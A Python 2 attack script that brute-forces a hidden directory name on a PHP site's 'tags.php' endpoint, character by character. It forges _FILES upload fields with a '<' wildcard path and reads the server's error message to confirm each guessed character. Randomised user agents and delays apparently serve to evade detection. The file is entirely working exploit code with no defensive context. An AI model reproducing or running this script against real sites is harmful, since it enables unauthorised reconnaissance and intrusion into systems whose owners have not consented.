#-*-coding:utf8-*-
import requests,time,random
import itertools
from fake_useragent import UserAgent

url = "http://target/tags.php"
ua = UserAgent()
num = 1
pre = ''
characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
while num < 10:
	for a  in characters:
		post = {"dpost":"save",
		"_FILES[lol][tmp_name]":"./"+pre+a+"</images/admin_top_logo.gif",
		"_FILES[lol][name]=":"0",
		"_FILES[lol][size]=":"0",
		"_FILES[lol][type]":"image/gif"
		}
		headers={"User-Agent":ua.random}
		r = requests.post(url,data=post,headers=headers,timeout=10)
		time.sleep(random.randint(1,3))
		print "[++尝试第"+str(num)+"位"+a
		if "Upload filetype not allow" not in r.text:
			print "第"+str(num)+"位找到了："+a
		 	num +=1
		 	pre = pre+a
		 	print pre
		 	break
		else:	
			print a+'++]\n'